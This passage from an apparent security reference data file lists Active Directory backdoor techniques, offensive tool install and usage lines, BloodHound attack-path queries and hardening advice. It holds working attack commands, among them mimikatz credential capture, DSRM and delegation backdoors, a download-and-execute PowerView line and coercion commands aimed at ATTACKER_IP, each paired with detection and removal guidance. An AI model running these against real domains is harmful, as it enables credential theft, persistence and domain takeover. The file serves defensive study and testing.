    removal: "Remove the WMI objects: Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='BackdoorFilter'\" | Remove-WMIObject. Remove associated Consumer and Binding objects. Audit all WMI subscriptions."
  },
  {
    name: "DSRM Password Abuse",
    description: "Use the Directory Services Restore Mode (DSRM) password on a DC. When DSRM logon behavior is set to 2, the DSRM account can authenticate over the network.",
    command: "Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DsrmAdminLogonBehavior' -Value 2 (then authenticate with DSRM password hash)",
    detection: "Monitor the DsrmAdminLogonBehavior registry value. Alert when it is set to 2. Monitor for authentication using the DSRM account (local Administrator on DC). Audit registry changes on DCs.",
    removal: "Set DsrmAdminLogonBehavior back to 0 or 1. Change the DSRM password: ntdsutil 'set dsrm password' 'reset password on server null' quit quit. Audit all DC registry settings."
  },
  {
    name: "Kerberos Delegation Backdoor",
    description: "Configure unconstrained or constrained delegation on a controlled account to enable persistent impersonation capabilities.",
    command: "Set-DomainObject -Identity CONTROLLED_ACCOUNT -Set @{useraccountcontrol=528384} (enables TRUSTED_FOR_DELEGATION)",
    detection: "Monitor changes to userAccountControl attribute (delegation flags). Alert on new unconstrained delegation configurations. Audit msDS-AllowedToDelegateTo changes. Regular delegation audit.",
    removal: "Remove delegation flags from the account. Clear msDS-AllowedToDelegateTo values. Disable TrustedForDelegation. Audit all delegation configurations in the domain."
  },
  {
    name: "Custom Security Support Provider (SSP)",
    description: "Register a custom SSP DLL (like mimilib.dll) on a DC to capture all authentication credentials in cleartext to a log file.",
    command: "mimikatz misc::memssp (in-memory) OR copy mimilib.dll to C:\\Windows\\System32 and register via registry HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages",
    detection: "Monitor LSA Security Packages registry key for new entries. Detect DLL drops in System32. Monitor for mimilib.dll or unknown DLLs loaded by LSASS. Audit SSP registration events.",
    removal: "Remove the malicious DLL from System32. Remove the SSP entry from the registry. Restart the DC. Delete any credential log files. Audit for exfiltrated credentials and rotate affected passwords."
  },
  {
    name: "Trust Account Manipulation",
    description: "Modify trust account passwords or properties to maintain persistent access across domain trust boundaries.",
    command: "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"' (extract trust keys, then forge inter-realm TGTs)",
    detection: "Monitor trust account password changes. Audit inter-realm TGT requests. Detect anomalous cross-trust authentication. Monitor Event ID 4706 (new trust created) and 4707 (trust removed).",
    removal: "Reset trust passwords on both sides. Recreate trusts if compromise is suspected. Audit all cross-trust authentication. Verify SID filtering is enabled on external trusts."
  },
  {
    name: "Certificate Template Backdoor",
    description: "Modify a certificate template to enable ESC1 conditions (enrollee supplies subject + client auth EKU) for persistent certificate-based access.",
    command: "certipy template -u admin@domain.local -p password -template BackdoorTemplate -set ENROLLEE_SUPPLIES_SUBJECT -set CLIENT_AUTHENTICATION",
    detection: "Baseline and monitor certificate template configurations. Alert on changes to msPKI-Certificate-Name-Flag and pKIExtendedKeyUsage. Audit template modification events (Event ID 4899).",
    removal: "Revert the template to its original configuration. Revoke any certificates issued using the backdoored template. Audit all certificate templates against a known-good baseline."
  },
  {
    name: "RBCD Backdoor",
    description: "Set msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer object pointing to a controlled account for persistent impersonation access.",
    command: "Set-DomainObject -Identity 'TARGET$' -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD} (where $SD contains the controlled account's SID)",
    detection: "Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Alert on RBCD delegation configurations. Regular audit of delegation attributes across all computer objects.",
    removal: "Clear the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target. Delete the controlled computer/service account. Audit all RBCD delegations. Set MachineAccountQuota to 0."
  }
];

// ---------------------------------------------------------------------------
// 4. AD_TOOLS — 25 tools
// ---------------------------------------------------------------------------

const AD_TOOLS = [
  {
    name: "BloodHound",
    description: "Graph-based Active Directory attack path analysis tool. Visualizes relationships and permissions to find the shortest path to Domain Admin and other high-value targets.",
    install: "Download from https://github.com/BloodHoundAD/BloodHound. Requires Neo4j database. Docker: docker-compose up (from BloodHound repo). BloodHound CE: docker-compose -f docker-compose.yml up.",
    usage: "Import SharpHound/BloodHound.py collection data (.zip). Use pre-built queries or write custom Cypher queries. Analyze: shortest paths to DA, Kerberoastable users, unconstrained delegation, ACL attack paths."
  },
  {
    name: "SharpHound",
    description: "Official BloodHound data collector for Windows. Enumerates AD objects, ACLs, sessions, group memberships, trusts, and other relationships for graph analysis.",
    install: "Download from BloodHound repository (Collectors directory). Compile from source or use pre-compiled binary. Runs as .exe or PowerShell (SharpHound.ps1).",
    usage: "SharpHound.exe -c All --zipfilename output.zip (full collection). -c DCOnly for DC-only collection (less noise). -c Session for session enumeration. --stealth for slower, stealthier collection."
  },
  {
    name: "BloodHound.py",
    description: "Python-based BloodHound data collector that runs from Linux. Uses LDAP and other protocols to collect the same data as SharpHound without needing Windows.",
    install: "pip install bloodhound. Or: git clone https://github.com/dirkjanm/BloodHound.py && pip install .",
    usage: "bloodhound-python -u user -p password -d domain.local -dc DC_IP -c All. Supports --zip for compressed output. Use -c DCOnly for reduced collection. --dns-tcp for DNS over TCP."
  },
  {
    name: "PowerView",
    description: "PowerShell toolkit for Windows domain enumeration and exploitation. Provides cmdlets for user, group, computer, GPO, ACL, and trust enumeration plus exploitation functions.",
    install: "Import-Module PowerView.ps1 (from PowerSploit/Recon). Or: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')",
    usage: "Get-DomainUser, Get-DomainGroup, Get-DomainComputer, Get-DomainGPO, Find-InterestingDomainAcl, Get-DomainTrust, Find-DomainShare, Invoke-Kerberoast, Find-LocalAdminAccess"
  },
  {
    name: "Rubeus",
    description: "C# toolset for raw Kerberos interaction and abuses. Supports Kerberoasting, AS-REP roasting, ticket requests, S4U delegation abuse, ticket forging, and more.",
    install: "Compile from source: https://github.com/GhostPack/Rubeus. Build with Visual Studio or dotnet build. Use BOF version for Cobalt Strike.",
    usage: "Rubeus.exe kerberoast /outfile:hashes.txt. asreproast. asktgt /user:USER /rc4:HASH. s4u /ticket:TGT /impersonateuser:admin /msdsspn:cifs/target. golden /rc4:HASH /user:admin /domain:domain.local /sid:SID. monitor /interval:5."
  },
  {
    name: "Mimikatz",
    description: "Windows credential extraction tool. Dumps passwords, hashes, PINs, and Kerberos tickets from memory. Also supports pass-the-hash, pass-the-ticket, Golden/Silver tickets, and DCSync.",
    install: "Download from https://github.com/gentilkiwi/mimikatz. Pre-compiled binaries in Releases. Requires admin/SYSTEM for most features. Use Invoke-Mimikatz for PowerShell delivery.",
    usage: "privilege::debug. sekurlsa::logonpasswords (dump credentials). sekurlsa::tickets /export. kerberos::golden (forge tickets). lsadump::dcsync /user:krbtgt. lsadump::sam. misc::skeleton."
  },
  {
    name: "CrackMapExec (NetExec)",
    description: "Swiss army knife for network pentesting. Supports SMB, WinRM, LDAP, MSSQL, SSH, and RDP protocols. Automates credential testing, command execution, and enumeration across multiple targets.",
    install: "pip install crackmapexec (legacy). NetExec (successor): pip install netexec. Or: apt install crackmapexec. Docker: docker run crackmapexec.",
    usage: "crackmapexec smb targets -u user -p pass --shares. --sam (dump SAM). --lsa (dump LSA). --ntds (dump NTDS). -x 'whoami' (execute command). --pass-pol. --users. --loggedon-users. smb targets -u users.txt -p 'Password1' --no-bruteforce (password spray)."
  },
  {
    name: "Impacket",
    description: "Collection of Python classes for working with network protocols. Includes tools for SMB, MSRPC, Kerberos, LDAP, and more. Essential for offensive AD operations from Linux.",
    install: "pip install impacket. Or: git clone https://github.com/fortra/impacket && pip install . Pre-installed in Kali Linux.",
    usage: "secretsdump.py (DCSync, SAM, LSA, NTDS). psexec.py / wmiexec.py / smbexec.py (remote execution). GetUserSPNs.py (Kerberoasting). GetNPUsers.py (AS-REP roasting). ntlmrelayx.py (NTLM relay). getTGT.py / getST.py (Kerberos). addcomputer.py (RBCD)."
  },
  {
    name: "Certipy",
    description: "Python tool for Active Directory Certificate Services (ADCS) enumeration and abuse. Identifies vulnerable certificate templates (ESC1-ESC11) and automates exploitation.",
    install: "pip install certipy-ad. Or: git clone https://github.com/ly4k/Certipy && pip install .",
    usage: "certipy find -vulnerable -u user@domain -p pass -dc-ip DC_IP. certipy req -ca CA -template Vuln -upn admin@domain. certipy auth -pfx cert.pfx. certipy shadow auto -account TARGET$. certipy ca -backup."
  },
  {
    name: "ADRecon",
    description: "PowerShell tool that extracts and combines various AD artifacts into a comprehensive Excel report. Useful for security assessments and AD auditing.",
    install: "Download from https://github.com/adrecon/ADRecon. Import-Module ADRecon.ps1. Requires ActiveDirectory module and ImportExcel for Excel output.",
    usage: "Invoke-ADRecon -GenExcel C:\\ADRecon-Report. Collects: users, groups, computers, GPOs, OUs, ACLs, trusts, SPNs, LAPS, DNS, printers, and more. -Collect Domain,Users,Groups,Computers for selective collection."
  },
  {
    name: "Responder",
    description: "LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers. Captures NTLM hashes from name resolution poisoning for cracking or relay.",
    install: "git clone https://github.com/lgandx/Responder. Pre-installed in Kali: responder. Python3 required.",
    usage: "responder -I eth0 -wrfv (full poisoning with WPAD rogue proxy). -A for analyze mode (passive, no poisoning). Captured hashes stored in logs/ directory. Feed hashes to hashcat -m 5600 (NTLMv2) or -m 5500 (NTLMv1)."
  },
  {
    name: "Kerbrute",
    description: "Fast Kerberos-based username enumeration and password spraying tool written in Go. Uses Kerberos pre-authentication errors for stealthier enumeration than LDAP.",
    install: "Download from https://github.com/ropnop/kerbrute/releases. Or: go install github.com/ropnop/kerbrute@latest.",
    usage: "kerbrute userenum -d domain.local usernames.txt --dc DC_IP. kerbrute passwordspray -d domain.local users.txt 'Password123!'. kerbrute bruteuser -d domain.local passwords.txt username."
  },
  {
    name: "Whisker",
    description: "C# tool for manipulating msDS-KeyCredentialLink attribute on AD objects. Enables Shadow Credentials attacks for privilege escalation and persistence.",
    install: "Compile from source: https://github.com/eladshamir/Whisker. Build with Visual Studio. Python version: pyWhisker (pip install pywhisker).",
    usage: "Whisker.exe add /target:TARGET$ /domain:domain.local /dc:DC_IP. Whisker.exe list /target:TARGET$. Whisker.exe remove /target:TARGET$ /deviceid:GUID."
  },
  {
    name: "SharpGPOAbuse",
    description: "Tool to take advantage of misconfigurations in GPO permissions for code execution on domain-joined machines. Supports scheduled tasks, startup scripts, and user rights.",
    install: "Compile from source: https://github.com/FSecureLABS/SharpGPOAbuse. Build with Visual Studio.",
    usage: "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author SYSTEM --Command cmd.exe --Arguments '/c calc.exe' --GPOName 'Vuln GPO'. --AddUserRights --UserRights 'SeDebugPrivilege' --UserAccount attacker --GPOName 'Vuln GPO'."
  },
  {
    name: "Certify",
    description: "C# tool for enumerating and abusing Active Directory Certificate Services. Identifies vulnerable templates and misconfigurations. Windows counterpart to Certipy.",
    install: "Compile from source: https://github.com/GhostPack/Certify. Build with Visual Studio or dotnet build.",
    usage: "Certify.exe find (enumerate all templates). Certify.exe find /vulnerable (find exploitable templates). Certify.exe request /ca:CA /template:VulnTemplate /altname:admin@domain.local."
  },
  {
    name: "PetitPotam",
    description: "Tool to coerce Windows hosts to authenticate to an attacker using MS-EFSRPC (Encrypting File System Remote Protocol). Commonly chained with NTLM relay.",
    install: "git clone https://github.com/topotam/PetitPotam. Python3 required. Impacket dependency.",
    usage: "python3 PetitPotam.py ATTACKER_IP TARGET_IP (unauthenticated). python3 PetitPotam.py -u user -p pass -d domain ATTACKER_IP TARGET_IP (authenticated). Chain with ntlmrelayx for LDAP or ADCS relay."
  },
  {
    name: "Coercer",
    description: "All-in-one tool that combines multiple authentication coercion techniques (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, and more) into a single utility.",
    install: "pip install coercer. Or: git clone https://github.com/p0dalirius/Coercer && pip install .",
    usage: "coercer scan -u user -p pass -d domain.local -t TARGET_IP (scan for vulnerable methods). coercer coerce -u user -p pass -d domain.local -l ATTACKER_IP -t TARGET_IP (coerce authentication using all methods)."
  },
  {
    name: "DSInternals",
    description: "PowerShell module for interacting with AD database internals. Supports offline ntds.dit extraction, password auditing, Key Credential operations, and Azure AD integration.",
    install: "Install-Module DSInternals -Force. Or download from https://github.com/MichaelGrafnetter/DSInternals.",
    usage: "Get-ADDBAccount -All -DBPath 'C:\\ntds.dit' -BootKey BOOTKEY. Test-PasswordQuality -Account (Get-ADDBAccount -All). Get-ADKeyCredentialLink. Set-ADDBAccountPassword. Add-ADDBSidHistory."
  },
  {
    name: "LAPSToolkit",
    description: "PowerShell toolkit for auditing and abusing LAPS deployments. Identifies which users can read LAPS passwords and finds computers with LAPS deployed.",
    install: "Import-Module LAPSToolkit.ps1. Download from https://github.com/leoloobeek/LAPSToolkit.",
    usage: "Get-LAPSComputers (find LAPS-deployed computers). Get-LAPSDelegatedGroups (who can read passwords). Find-LAPSDelegatedGroups. Get-LAPSPasswords (if authorized, read passwords)."
  },
  {
    name: "SpoolSample",
    description: "Tool that triggers the Print Spooler bug to coerce authentication from a target machine to an attacker-controlled system. Requires valid domain credentials.",
    install: "Compile from source: https://github.com/leechristensen/SpoolSample. Build with Visual Studio. Python version: printerbug.py (dirkjanm/krbrelayx).",
    usage: "SpoolSample.exe TARGET_DC ATTACKER_SERVER. Target authenticates back to attacker with machine account credentials. Chain with unconstrained delegation or NTLM relay."
  },
  {
    name: "BloodyAD",
    description: "Python-based tool for Active Directory privilege escalation through LDAP. Supports ACL abuse, password changes, delegation manipulation, and Shadow Credentials.",
    install: "pip install bloodyAD. Or: git clone https://github.com/CravateRouge/bloodyAD && pip install .",
    usage: "bloodyAD -u user -p pass -d domain.local --host DC_IP set password target 'NewPass123!'. add groupMember 'Domain Admins' attacker. set rbcd TARGET$ CONTROLLED$. add shadowCredentials TARGET$. get writable."
  },
  {
    name: "hashcat",
    description: "Advanced password recovery (cracking) tool. Supports hundreds of hash types including NTLM, Kerberos, NTLMv2, and certificate-based hashes. GPU-accelerated.",
    install: "Download from https://hashcat.net/hashcat/. Pre-installed in Kali. Requires GPU drivers (OpenCL/CUDA). apt install hashcat.",
    usage: "hashcat -m 1000 ntlm.txt wordlist.txt (NTLM). -m 13100 (Kerberoast TGS-REP). -m 18200 (AS-REP). -m 5600 (NTLMv2). -m 5500 (NTLMv1). -a 0 (dictionary). -a 3 (brute force). -r rules/best64.rule (rules). --show (show cracked)."
  },
  {
    name: "John the Ripper",
    description: "Password cracking tool with extensive format support. Community-enhanced version (jumbo) supports Kerberos, NTLM, and many other AD-related hash types.",
    install: "apt install john. Or compile jumbo: git clone https://github.com/openwall/john && cd john/src && ./configure && make.",
    usage: "john --format=krb5tgs hashes.txt --wordlist=wordlist.txt (Kerberoast). --format=krb5asrep (AS-REP). --format=nt (NTLM). --format=netntlmv2 (NTLMv2). --rules=best64. --show (display cracked)."
  },
  {
    name: "mitm6",
    description: "Tool that exploits IPv6 DHCP to perform man-in-the-middle attacks on IPv4 networks. Replies to DHCPv6 requests and sets the attacker as DNS server for relay attacks.",
    install: "pip install mitm6. Or: git clone https://github.com/dirkjanm/mitm6 && pip install .",
    usage: "mitm6 -d domain.local (start DHCPv6 poisoning). Chain with ntlmrelayx: ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker-wpad --delegate-access. Captures NTLM auth from WPAD requests. Enables RBCD attack."
  },
  {
    name: "ldapdomaindump",
    description: "Tool for dumping Active Directory information via LDAP into human-readable HTML, JSON, and grep-friendly formats. Quick domain overview for initial reconnaissance.",
    install: "pip install ldapdomaindump. Pre-installed in Kali Linux.",
    usage: "ldapdomaindump -u 'domain\\user' -p password DC_IP. Outputs: domain_users.html, domain_computers.html, domain_groups.html, domain_policy.html, domain_trusts.html. -o output_dir for custom output directory."
  }
];

// ---------------------------------------------------------------------------
// 5. BLOODHOUND_QUERIES — 25 Cypher queries
// ---------------------------------------------------------------------------

const BLOODHOUND_QUERIES = [
  {
    name: "Shortest Path to Domain Admin",
    query: "MATCH (n:User),(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}),p=shortestPath((n)-[*1..]->(m)) RETURN p",
    description: "Find the shortest attack path from any user to the Domain Admins group. Reveals the minimum number of hops required for privilege escalation."
  },
  {
    name: "Kerberoastable Users",
    query: "MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames, u.admincount, u.enabled ORDER BY u.admincount DESC",
    description: "List all user accounts with SPNs set, indicating they are Kerberoastable. Sorted by admin count to prioritize high-value targets."
  },
  {
    name: "AS-REP Roastable Users",
    query: "MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name, u.enabled, u.admincount",
    description: "Find user accounts that do not require Kerberos pre-authentication and can be AS-REP roasted for offline password cracking."
  },
  {
    name: "Unconstrained Delegation Computers",
    query: "MATCH (c:Computer) WHERE c.unconstraineddelegation=true AND c.name <> 'DC_NAME' RETURN c.name, c.operatingsystem",
    description: "Find non-DC computers with unconstrained delegation enabled. These can capture TGTs of any user that authenticates to them."
  },
  {
    name: "Constrained Delegation Users",
    query: "MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate",
    description: "Identify user accounts with constrained delegation configured and their allowed delegation targets."
  },
  {
    name: "Constrained Delegation Computers",
    query: "MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate",
    description: "Find computer accounts with constrained delegation and their allowed delegation targets for S4U2Proxy abuse."
  },
  {
    name: "Users with DCSync Rights",
    query: "MATCH (n)-[:GetChanges|GetChangesAll]->(m:Domain) WHERE NOT n:Group RETURN n.name, labels(n)",
    description: "Identify non-group principals with replication rights (GetChanges/GetChangesAll) that can perform DCSync attacks."
  },
  {
    name: "Shortest Path from Owned to Domain Admin",
    query: "MATCH (n {owned:true}),(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}),p=shortestPath((n)-[*1..]->(m)) RETURN p",
    description: "Find the shortest path from any owned/compromised principal to Domain Admin. Use after marking compromised accounts."
  },
  {
    name: "Domain Admin Sessions",
    query: "MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN c.name, u.name",
    description: "Find computers where Domain Admins have active sessions. These are high-priority targets for credential theft."
  },
  {
    name: "Users with Local Admin",
    query: "MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, count(c) as adminCount ORDER BY adminCount DESC",
    description: "List users with local admin rights on computers, sorted by number of computers. Identifies over-privileged accounts."
  },
  {
    name: "Computers where Domain Users are Local Admin",
    query: "MATCH (g:Group {name:'DOMAIN USERS@DOMAIN.LOCAL'})-[:AdminTo]->(c:Computer) RETURN c.name",
    description: "Find computers where the Domain Users group has local admin rights. Any domain user can compromise these machines."
  },
  {
    name: "GenericAll on Users",
    query: "MATCH (n)-[:GenericAll]->(u:User) WHERE NOT n.name STARTS WITH 'DOMAIN' RETURN n.name, u.name, labels(n)",
    description: "Find principals with GenericAll permission on user objects. Can reset passwords, set SPNs, or modify attributes."
  },
  {
    name: "GenericAll on Groups",
    query: "MATCH (n)-[:GenericAll]->(g:Group) WHERE NOT n.name STARTS WITH 'DOMAIN' AND g.admincount=true RETURN n.name, g.name",
    description: "Find principals with GenericAll on privileged groups (admincount=true). Can add members to the group."
  },
  {
    name: "WriteDacl on Domain Object",
    query: "MATCH (n)-[:WriteDacl]->(d:Domain) WHERE NOT n:Group OR NOT n.name STARTS WITH 'DOMAIN' RETURN n.name, d.name, labels(n)",
    description: "Identify principals with WriteDacl on the domain object. Can grant themselves DCSync rights."
  },
  {
    name: "WriteOwner Permissions",
    query: "MATCH (n)-[:WriteOwner]->(m) WHERE m.admincount=true OR m:Domain RETURN n.name, m.name, labels(m)",
    description: "Find principals with WriteOwner on privileged objects. Can take ownership and then modify ACLs."
  },
  {
    name: "GPO Links to Privileged OUs",
    query: "MATCH (g:GPO)-[:GpLink]->(o:OU)-[:Contains*1..]->(u:User)-[:MemberOf*1..]->(p:Group {admincount:true}) RETURN g.name, o.name, u.name, p.name",
    description: "Find GPOs linked to OUs containing privileged users. If GPO is writable, can target privileged accounts."
  },
  {
    name: "Find All GPO Editors",
    query: "MATCH (n)-[:GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner]->(g:GPO) RETURN n.name, g.name, labels(n)",
    description: "Identify all principals that can modify Group Policy Objects. GPO modification enables code execution on linked systems."
  },
  {
    name: "Hosts with Obsolete OS",
    query: "MATCH (c:Computer) WHERE c.operatingsystem =~ '(?i).*2003.*|.*2008.*|.*xp.*|.*vista.*|.*7.*' AND c.enabled=true RETURN c.name, c.operatingsystem",
    description: "Find enabled computers running obsolete operating systems that are likely unpatched and vulnerable."
  },
  {
    name: "Users with Passwords Not Required",
    query: "MATCH (u:User) WHERE u.passwordnotreqd=true AND u.enabled=true RETURN u.name, u.description",
    description: "Find enabled accounts where the PASSWD_NOTREQD flag is set. These accounts may have empty or trivial passwords."
  },
  {
    name: "Users Never Changed Password",
    query: "MATCH (u:User) WHERE u.pwdlastset < (datetime().epochSeconds - 31536000) AND u.enabled=true RETURN u.name, u.pwdlastset ORDER BY u.pwdlastset ASC",
    description: "Find enabled accounts that have not changed their password in over a year. Stale passwords are more likely to be compromised."
  },
  {
    name: "RBCD Attack Paths",
    query: "MATCH (n)-[:AllowedToAct]->(c:Computer) RETURN n.name, c.name, labels(n)",
    description: "Find all Resource-Based Constrained Delegation relationships. These indicate accounts that can impersonate users to the target computer."
  },
  {
    name: "Cross-Domain Attack Paths",
    query: "MATCH (n:User {domain:'CHILD.DOMAIN.LOCAL'}),(m:Group {name:'ENTERPRISE ADMINS@DOMAIN.LOCAL'}),p=shortestPath((n)-[*1..]->(m)) RETURN p",
    description: "Find attack paths from a child domain user to Enterprise Admins in the parent domain via trust relationships."
  },
  {
    name: "Users with SID History",
    query: "MATCH (u:User) WHERE u.sidhistory IS NOT NULL AND size(u.sidhistory) > 0 RETURN u.name, u.sidhistory",
    description: "Find users with SID History set. SID History from privileged accounts in other domains can grant unintended access."
  },
  {
    name: "High-Value Targets Overview",
    query: "MATCH (u:User) WHERE u.highvalue=true RETURN u.name, u.enabled, u.admincount, u.hasspn, u.dontreqpreauth, u.unconstraineddelegation",
    description: "List all high-value targets with their key security properties: enabled status, admin count, SPN, pre-auth requirements, and delegation settings."
  },
  {
    name: "Shadow Admin Paths (Indirect Admin)",
    query: "MATCH p=allShortestPaths((n:User)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|AddMember|ForceChangePassword|Owns*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) WHERE NOT n.admincount=true RETURN p",
    description: "Find 'shadow admins' -- users who are not in privileged groups but have an ACL-based path to Domain Admin without needing exploitation."
  }
];

// ---------------------------------------------------------------------------
// 6. AD_HARDENING — 20 hardening recommendations
// ---------------------------------------------------------------------------

const AD_HARDENING = [
  {
    recommendation: "Implement Tiered Administration Model",
    description: "Separate administrative privileges into three tiers: Tier 0 (Domain Controllers and AD), Tier 1 (Servers and Applications), Tier 2 (Workstations and Users). Prevent credential exposure across tiers.",
    implementation: "Create separate admin accounts for each tier. Restrict Tier 0 admin logon to DCs only via GPO (User Rights Assignment > 'Deny log on locally' / 'Deny logon through RDP'). Use Privileged Access Workstations (PAWs) for each tier. Implement logon restrictions via Authentication Policies and Silos (Windows Server 2012 R2+).",
    priority: "critical"
  },
  {
    recommendation: "Deploy Privileged Access Workstations (PAWs)",
    description: "Use dedicated, hardened workstations exclusively for administrative tasks. PAWs should have no internet access, restricted software, and enhanced monitoring.",
    implementation: "Provision dedicated hardware or VMs. Apply restrictive GPO (no internet, no email, no Office). Restrict admin account logon to PAWs only via Authentication Policy Silos. Enable Device Guard, Credential Guard, and AppLocker. Monitor all PAW activity.",
    priority: "critical"
  },
  {
    recommendation: "Enable Credential Guard",
    description: "Use Windows Credential Guard to protect NTLM hashes, Kerberos tickets, and credentials stored by Credential Manager in an isolated virtual container (VBS).",
    implementation: "Enable via GPO: Computer Configuration > Administrative Templates > System > Device Guard > Turn On Virtualization Based Security. Set Credential Guard Configuration to 'Enabled with UEFI lock'. Requires UEFI, Secure Boot, TPM 2.0. Test compatibility before deployment.",
    priority: "critical"
  },
  {
    recommendation: "Enable LSA Protection (RunAsPPL)",
    description: "Configure LSASS to run as a Protected Process Light (PPL), preventing unauthorized code from reading LSASS memory (blocks Mimikatz, procdump, and similar tools).",
    implementation: "Registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL = 1. Or via GPO: Configure LSASS to run as a protected process. Deploy via startup script or SCCM. Verify with Task Manager (LSASS shows as PPL). Windows 11 22H2+ enables by default.",
    priority: "critical"
  },
  {
    recommendation: "Rotate krbtgt Password Regularly",
    description: "Regularly rotate the krbtgt account password to limit the window for Golden Ticket attacks. The password must be changed twice (with replication between) to fully invalidate old tickets.",
    implementation: "Use the krbtgt password reset script from Microsoft (Reset-KrbtgtKeyInteractive.ps1). Schedule rotation every 180 days minimum (90 days preferred). Always rotate TWICE with 12-24 hours between rotations. Verify replication to all DCs before second rotation. Test in non-production first.",
    priority: "high"
  },
  {
    recommendation: "Set MachineAccountQuota to Zero",
    description: "Prevent authenticated users from adding computer accounts to the domain. Default quota of 10 enables RBCD attacks by allowing creation of attacker-controlled computer accounts.",
    implementation: "Set ms-DS-MachineAccountQuota to 0: Set-ADDomain -Identity domain.local -Replace @{'ms-DS-MachineAccountQuota'=0}. Or via ADSI Edit on the domain object. Delegate computer account creation to specific admin groups. Audit existing computer accounts created by non-admins.",
    priority: "high"
  },
  {
    recommendation: "Disable NTLM Authentication",
    description: "Restrict or disable NTLM authentication to prevent pass-the-hash and NTLM relay attacks. Force Kerberos authentication wherever possible.",
    implementation: "GPO: Network Security > Restrict NTLM > Incoming/Outgoing NTLM Traffic (set to 'Deny all' or 'Deny all domain accounts'). Enable audit mode first to identify NTLM dependencies. Create exceptions for legacy systems that require NTLM. Monitor Event IDs 4624 (logon type) for remaining NTLM usage.",
    priority: "high"
  },
  {
    recommendation: "Enable SMB Signing",
    description: "Require SMB signing on all systems to prevent NTLM relay attacks via SMB. Without signing, attackers can relay captured NTLM authentication to SMB services.",
    implementation: "GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options. Set 'Microsoft network server: Digitally sign communications (always)' to Enabled. Set 'Microsoft network client: Digitally sign communications (always)' to Enabled. Apply to all systems, especially domain controllers.",
    priority: "high"
  },
  {
    recommendation: "Enable LDAP Signing and Channel Binding",
    description: "Require LDAP signing and channel binding to prevent NTLM relay attacks targeting LDAP/LDAPS services on domain controllers.",
    implementation: "GPO: Domain controller LDAP server signing requirement = Require signing. Registry on DCs: HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\LDAPServerIntegrity = 2. Enable LDAP channel binding: LdapEnforceChannelBinding = 2. Test with audit mode (value 1) before enforcement.",
    priority: "high"
  },
  {
    recommendation: "Use Protected Users Security Group",
    description: "Add privileged accounts to the Protected Users group to enforce strict security: no NTLM authentication, no delegation, short TGT lifetime, and AES-only Kerberos.",
    implementation: "Add accounts: Add-ADGroupMember -Identity 'Protected Users' -Members admin1,admin2. Note: Breaks NTLM auth for these accounts (test first). Service accounts may break if they use NTLM. TGT lifetime forced to 4 hours. No credential caching. No delegation. Requires domain functional level 2012 R2+.",
    priority: "high"
  },
  {
    recommendation: "Deploy LAPS (Local Administrator Password Solution)",
    description: "Automatically rotate local administrator passwords on domain-joined machines. Each machine gets a unique, random password stored in AD with access control.",
    implementation: "Install LAPS client MSI on all machines (via GPO/SCCM). Extend AD schema (Update-AdmPwdADSchema). Set permissions (Set-AdmPwdComputerSelfPermission, Set-AdmPwdReadPasswordPermission). Configure via GPO: Enable local admin password management, set complexity and age. Use Windows LAPS (built-in on Windows 11/Server 2025) for encrypted password storage.",
    priority: "high"
  },
  {
    recommendation: "Audit and Restrict Certificate Templates (ADCS)",
    description: "Review all ADCS certificate templates for dangerous configurations: ENROLLEE_SUPPLIES_SUBJECT with Client Auth EKU, overly permissive enrollment rights, and vulnerable template ACLs.",
    implementation: "Run: certipy find -vulnerable -u user -p pass (or Certify.exe find /vulnerable). Remove ENROLLEE_SUPPLIES_SUBJECT from templates unless required. Restrict enrollment to specific security groups. Require CA manager approval for sensitive templates. Disable unused templates. Disable HTTP web enrollment. Enable HTTPS with EPA.",
    priority: "high"
  },
  {
    recommendation: "Disable LLMNR and NBT-NS",
    description: "Disable Link-Local Multicast Name Resolution and NetBIOS Name Service to prevent name resolution poisoning that leads to NTLM hash capture.",
    implementation: "Disable LLMNR via GPO: Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution = Enabled. Disable NBT-NS: Network adapter properties > WINS tab > Disable NetBIOS over TCP/IP. Or via GPO DHCP option 001 = 0x2. Apply to all workstations and servers.",
    priority: "high"
  },
  {
    recommendation: "Implement Fine-Grained Password Policies",
    description: "Create strong password policies for privileged accounts and service accounts that exceed the default domain password policy. Enforce complexity, length, and rotation.",
    implementation: "Create Password Settings Objects (PSOs) via ADAC or PowerShell (New-ADFineGrainedPasswordPolicy). Service accounts: 25+ character passwords, 90-day rotation (or use gMSAs). Admin accounts: 20+ character passwords, no password reuse, MFA required. Link PSOs to appropriate groups. Monitor with Get-ADFineGrainedPasswordPolicy.",
    priority: "medium"
  },
  {
    recommendation: "Use Group Managed Service Accounts (gMSAs)",
    description: "Replace traditional service accounts with gMSAs that have automatic 120-character password rotation managed by AD. Eliminates password management burden and Kerberoasting risk.",
